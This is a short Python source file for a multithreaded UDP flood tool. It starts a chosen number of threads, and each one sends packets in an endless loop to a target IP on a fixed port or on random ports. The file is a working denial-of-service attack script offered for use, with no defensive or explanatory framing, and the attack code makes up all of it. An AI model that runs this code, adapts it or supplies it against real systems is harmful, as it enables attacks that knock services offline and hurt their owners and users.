# Import required modules
import os
import sys
import getopt
import threading
import random
import socket

# Define the udpflood() class
class udpflood(threading.Thread):
	# Class: udpflood()
	# Purpose: Flood the target
	# Functions: __init__(), run()
	
	# Define the __init__() function
	def __init__(self, target_ip, target_port):
		# Function: __init__()
		# Purpose: Append everything to self
		
		# Append everything to self
		threading.Thread.__init__(self)
		self.target_ip = target_ip
		self.target_port = target_port
		
	# Define the run() function
	def run(self):
		# Function: run()
		# Purpose: Flood the target
		
		# Create a socket
		with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as attack_socket:
			# Create infinite loop
			while True:
				# If the target port is random
				if int(self.target_port) == 0:
					# Send a packet to the target on a random port
					attack_socket.sendto(b"ABCDEFGHIJKLMNOPQRSTUVWXYZ", (self.target_ip, random.randint(1, 5000)))
				else:
					# Send a packet to the target on the specified port
					attack_socket.sendto(b"ABCDEFGHIJKLMNOPQRSTUVWXYZ", (self.target_ip, int(self.target_port)))
					
# Define the begin() function
def begin(attack_threads, target_ip, target_port):
	# Function: begin()
	# Purpose: Create attack threads
	
	# Create the threads
	for _ in range(int(attack_threads)):
		# Create the attack thread
		attack_thread = udpflood(target_ip, target_port)
		
		# Start the thread
		attack_thread.start()
